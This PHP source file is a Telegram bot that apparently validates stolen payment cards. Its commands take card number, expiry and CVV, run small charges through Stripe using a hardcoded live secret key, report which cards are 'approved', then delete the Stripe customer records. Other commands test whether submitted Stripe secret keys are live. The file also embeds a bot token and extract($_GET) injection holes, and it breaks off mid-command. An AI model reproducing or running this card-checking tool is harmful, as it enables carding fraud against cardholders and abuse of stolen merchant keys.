<?php

$botToken = "5020014857:AAEKpsdaG879QntGTTXbK3qgbc5c6nxB46k"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//////////=========[Start Command]=========//////////

if (strpos($message, "/start") === 0){
 sendMessage($chatId, "<b>Hello @$username!!%0AType /help to know all my commands!!%0A%0ABot Made by: Stowe .</b>", $message_id);
sendMessage($chatId, "What's new in this version 1.3 ?%0A%0A<b>Remove command</b> <code>/cd</code> And change it to <code>/scd</code>%0AFixed card pharse number error (double space)%0ARemake and edit Respone in all command%0A2 new command added: <code>/aut</code> to auth with cvv and <code>/acn</code> to check ccn auth%0A%0ANew command<code>/cus</code> to custom charge ammount%0ANew Emoji respone for bot added%0A", $message_id);
}

//////////=========[help Command]=========//////////
 elseif (strpos($message, "/help") === 0){
sendMessage($chatId, "<u>Bin lookup:</u> <code>/bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>/sk</code> sk_live_xxxxxxxxxxxxx%0A<u>charge 0.1$:</u> <code>/scd</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Web Based CC Checker:</u> <code>/web</code>%0A<u>charge 1$:</u> <code>/chg</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>kill 20$:</u> <code>/kill</code> xxxxxxxxxxxxxxxx|xx|xx|xxx<u>%0A<u>CCN charge 1$:</u> <code>/ccn</code> xxxxxxxxxxxxxxxx|xx|xx%0A<u>charge 1$ inr:</u> <code>/inr</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u> custom charge:</u> <code>/cus</code> xxxxxxxxxxxxxxxx|xx|xx|xxx|ammount min 50 is 0,5$%0AInfo:</u> <code>/info</code> To know ur info%0A%0A<b>Bot Made by: stowe .</b>", $message_id);
}
//////////=========[Info Command]=========//////////

elseif (strpos($message, "/info") === 0){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username%0A%0A<b>Bot Made by: Stowe .</b>", $message_id);
}
//////////=========[web Command]=========//////////

elseif (strpos($message, "/wen") === 0){
  sendMessage($chatId, "<b>Non sk checker:</b>stowechk.cc%0A%0A<b>sk checker:</b>stowechk.cc/skchk%0A%0A<b>Non ccn sk checker:</b>stowechk.cc/ccn%0A%0A<b>CCN sk checker:</b>stowechk.cc/ccn%0A%0A<b>IN sk checker:</b>stowechk.cc/insk%0A%0A", $message_id);
  }

//////////=========[log Command]=========//////////

elseif (strpos($message, "/log") === 0){
 sendMessage($chatId, "What's new in this version 1.3 ?%0A%0A<b>Remove command</b> <code>/cd</code> And change it to <code>/scd</code>%0AFixed card pharse number error (double space)%0ARemake and edit Respone in all command%0A2 new command added: <code>/aut</code> to auth with cvv and <code>/acn</code> to check ccn auth%0A%0ANew command<code>/cus</code> to custom charge ammount%0ANew Emoji respone for bot added%0A", $message_id);
}

//////////=========[Bin Command]=========//////////

elseif (strpos($message, "/bin") === 0){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Stowe .</b>', $message_id);
}

//////////=========[scd Command]=========//////////


elseif (strpos($message, "/scd") === 0){
$lista = substr($message, 5);
$i     = explode("|,/", $lista);
$cc    = $i[0];
$mon   = $i[1];
$year  = $i[2];
$year1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mon = $separa[1];
$year = $separa[2];
$cvv = $separa[3];

$skeys = array(
  1 => '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', // Enter at least one sk key
//2 => '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',-----------------|
//3 => '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',                 | Uncomment this, if you want to add more sk keys :)
//4 => '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',                 |
//5 => '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',-----------------|
); 
$skey = array_rand($skeys);
$sk = $skeys[$skey];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Alina Rebeckert');
$f = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
$id = trim(strip_tags(GetStr($f,'"id": "','"')));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[card][cvc]='.$cvv.'');
$result = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
$c = json_decode(curl_exec($ch), true);
curl_close($ch);
$pam = trim(strip_tags(GetStr($result,'"payment_method": "','"')));
$cvv = trim(strip_tags(GetStr($result,'"cvc_check": "','"')));
if ($c["status"] == "succeeded"){ 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');  
$result = curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
$result = curl_exec($ch);
$attachment_to_her = json_decode(curl_exec($ch), true);
curl_close($ch);
$attachment_to_her;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=50&currency=usd&customer='.$id.'');
$result = curl_exec($ch);
if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass"){  
$skresult = "✅APPROVED!✅";
$skresponse = "CVV MATCHES! CHARGE 0.01$ SUCCESSFUL!✅";
$skresponse1 = "The CVC was sent and was correct | Risk score: Normal - 50 ";
}else{
$skresult = "❌DECLINED!❌";
$skresponse = "❌UNCHECKED CARD❌";
$skresponse1 = "The CVC was sent but wasn’t checked by the issuing bank";
}}
elseif(strpos($result, '"cvc_check": "pass"')){
$skresult = "✅APPROVED!✅";
$skresponse = "CVV MATCH! AUTH ONLY✅";
$skresponse1 = "The CVC was sent and was correct but CVC old or changed by card holder";
}
elseif(strpos($result, 'security code is incorrect')){
$skresult = "✅APPROVED!";
$skresponse = "CCN APPROVED!✅";
$skresponse1 = "The CVC was sent but was incorrect - try /ccn to make charge";
}
elseif (isset($c["error"])){
$skresult = "❌DECLINED!❌";
$skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
$skresponse1 = " your card was declined, please try another card or contract your issuing bank";
}else{
$skresult = "❌Error❌";
$skresponse = "❌Unavailable to check cvc❌";
$skresponse1 = "The CVC wasn’t sent as it either wasn’t specified by the user, or the transaction is recurring and the CVC was previously deleted";
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);

sendMessage($chatId, '<u>💳 CARD:</u> <code>'.$lista.'</code>%0A<u>🔄 STATUS:</u> <b>'.$skresult.'</b>%0A<u>☑️ RESPONSE:</u> <b>'.$skresponse.'</b>%0A<u>ℹ️ EXTRA INFO:</u> <b>'.$skresponse1.'</b>%0A%0A----- BinData -----%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A--------------------<u>%0A%0A🔭 Checked By:</u> @'.$username.'<u>%0A⏳ Time Taken:</u> <b>'.$time.'s</b>%0A<b>GATE:</b> Stripe Charge%0A%0A<b>Bot Made by: stowe .</b>', $message_id);
}

//////////=========[Sk Key Check Command]=========//////////

elseif (strpos($message, "/sk") === 0){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot Made by: Stowe .</b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot Made by: Stowe .</b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot Made by: Stowe .</b>", $message_id);
}
elseif (strpos($result, 'Request rate limit exceeded')){
sendMessage($chatId, "<b>⚠️ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Rate Limit Key%0A%0A<b>Bot Made by: Stowe .</b>", $message_id);
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by: Stowe .</b>", $message_id);
};}


//////////=========[Chg Command]=========//////////

elseif (strpos($message, "/chg") === 0){
  $lista = substr($message, 5);
  $i     = explode("|", $lista);
  $cc    = $i[0];
  $mon   = $i[1];
  $year  = $i[2];
  $year1 = substr($yyyy, 2, 4);
  $cvv   = $i[3];
  error_reporting(0);
  date_default_timezone_set('Asia/Jakarta');
  if ($_SERVER['REQUEST_METHOD'] == "POST"){
  extract($_POST);
  }
  elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
  extract($_GET);
  }
  function GetStr($string, $start, $end){
  $str = explode($start, $string);
  $str = explode($end, $str[1]);  
  return $str[0];
  };
  $separa = explode("|", $lista);
  $cc = $separa[0];
  $mon = $separa[1];
  $year = $separa[2];
  $cvv = $separa[3];
  
  $skeys = array(
    1 => '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', // Enter at least one sk key
  //2 => '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',-----------------|
  //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
  //4 => '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',                 |
  //5 => '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',-----------------|
  ); 
  $skey = array_rand($skeys);
  $sk = $skeys[$skey];
  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: lookup.binlist.net',
  'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '');
  $fim = curl_exec($ch);
  $bank = GetStr($fim, '"bank":{"name":"', '"');
  $name = GetStr($fim, '"name":"', '"');
  $brand = GetStr($fim, '"brand":"', '"');
  $country = GetStr($fim, '"country":{"name":"', '"');
  $scheme = GetStr($fim, '"scheme":"', '"');
  $type = GetStr($fim, '"type":"', '"');
  if(strpos($fim, '"type":"credit"') !== false){
  $bin = 'Credit';
  }else{
  $bin = 'Debit';
  };
  curl_close($ch);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded',));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Alina Rebeckert');
  $f = curl_exec($ch);
  $info = curl_getinfo($ch);
  $time = $info['total_time'];
  $httpCode = $info['http_code'];
  $time = substr($time, 0, 4);
  $id = trim(strip_tags(GetStr($f,'"id": "','"')));
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded',));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[card][cvc]='.$cvv.'');
  $result = curl_exec($ch);
  $info = curl_getinfo($ch);
  $time = $info['total_time'];
  $httpCode = $info['http_code'];
  $time = substr($time, 0, 4);
  $c = json_decode(curl_exec($ch), true);
  curl_close($ch);
  $pam = trim(strip_tags(GetStr($result,'"payment_method": "','"')));
  $cvv = trim(strip_tags(GetStr($result,'"cvc_check": "','"')));
  if ($c["status"] == "succeeded"){ 
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
  curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');  
  $result = curl_exec($ch);
  curl_close($ch);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
  $result = curl_exec($ch);
  $attachment_to_her = json_decode(curl_exec($ch), true);
  curl_close($ch);
  $attachment_to_her;
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=100&currency=usd&customer='.$id.'');
  $result = curl_exec($ch);
  if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass"){  
  $skresult = "✅APPROVED!✅";
  $skresponse = "CVV MATCHES! CHARGE 1$ SUCCESSFUL!✅";
  $skresponse1 = "The CVC was sent and was correct | Risk score: Normal - 50 ";
}else{
  $skresult = "❌DECLINED!❌";
  $skresponse = "❌UNCHECKED CARD❌";
  $skresponse1 = "The CVC was sent but wasn’t checked by the issuing bank";
}}
elseif(strpos($result, '"cvc_check": "pass"')){
  $skresult = "✅APPROVED!✅";
  $skresponse = "CVV MATCH! AUTH ONLY✅";
  $skresponse1 = "The CVC was sent and was correct but CVC old or changed by card holder";
}
elseif(strpos($result, 'security code is incorrect')){
  $skresult = "✅APPROVED!";
  $skresponse = "CCN APPROVED!✅";
  $skresponse1 = "The CVC was sent but was incorrect - try /ccn to make charge";
}
elseif (isset($c["error"])){
  $skresult = "❌DECLINED!❌";
  $skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
  $skresponse1 = " your card was declined, please try another card or contract your issuing bank";
}else{
  $skresult = "❌Error❌";
  $skresponse = "❌Unavailable to check cvc❌";
  $skresponse1 = "The CVC wasn’t sent as it either wasn’t specified by the user, or the transaction is recurring and the CVC was previously deleted";
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);

sendMessage($chatId, '<u>💳 CARD:</u> <code>'.$lista.'</code>%0A<u>🔄 STATUS:</u> <b>'.$skresult.'</b>%0A<u>☑️ RESPONSE:</u> <b>'.$skresponse.'</b>%0A<u>ℹ️ EXTRA INFO:</u> <b>'.$skresponse1.'</b>%0A%0A----- BinData -----%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A--------------------<u>%0A%0A🔭 Checked By:</u> @'.$username.'<u>%0A⏳ Time Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: stowe .</b>', $message_id);
}

//////////=========[rp Command]=========//////////

elseif (strpos($message, "/rp") === 0){
  $lista = substr($message, 5);
  $i     = explode("|", $lista);
  $cc    = $i[0];
  $mon   = $i[1];
  $year  = $i[2];
  $year1 = substr($yyyy, 2, 4);
  $cvv   = $i[3];
  error_reporting(0);
  date_default_timezone_set('Asia/Jakarta');
  if ($_SERVER['REQUEST_METHOD'] == "POST"){
  extract($_POST);
  }
  elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
  extract($_GET);
  }
  function GetStr($string, $start, $end){
  $str = explode($start, $string);
  $str = explode($end, $str[1]);  
  return $str[0];
  };
  $separa = explode("|", $lista);
  $cc = $separa[0];
  $mon = $separa[1];
  $year = $separa[2];
  $cvv = $separa[3];
  
  $skeys = array(
    1 => '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', // Enter at least one sk key
  //2 => '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',-----------------|
  //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
  //4 => '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',                 |
  //5 => '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',-----------------|
  ); 
  $skey = array_rand($skeys);
  $sk = $skeys[$skey];
  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: lookup.binlist.net',
  'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '');
  $fim = curl_exec($ch);
  $bank = GetStr($fim, '"bank":{"name":"', '"');
  $name = GetStr($fim, '"name":"', '"');
  $brand = GetStr($fim, '"brand":"', '"');
  $country = GetStr($fim, '"country":{"name":"', '"');
  $scheme = GetStr($fim, '"scheme":"', '"');
  $type = GetStr($fim, '"type":"', '"');
  if(strpos($fim, '"type":"credit"') !== false){
  $bin = 'Credit';
  }else{
  $bin = 'Debit';
  };
  curl_close($ch);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'');
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  $headers = array();
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  $curl = curl_exec($ch);
  curl_close($ch);
  $info = curl_getinfo($ch);
  $time = $info['total_time'];
  $httpCode = $info['http_code'];
  $time = substr($time, 0, 4);
  $id = trim(strip_tags(GetStr($f,'"id": "','"')));
  $c = json_decode(curl_exec($ch), true);
  curl_close($ch);
  $attachment_to_her;
  $pam = trim(strip_tags(GetStr($result,'id')));
  $cvv = trim(strip_tags(GetStr($result,'"cvc_check": "','"')));
  if ($c["status"] == "pass"){ 
  $ch = curl_init();
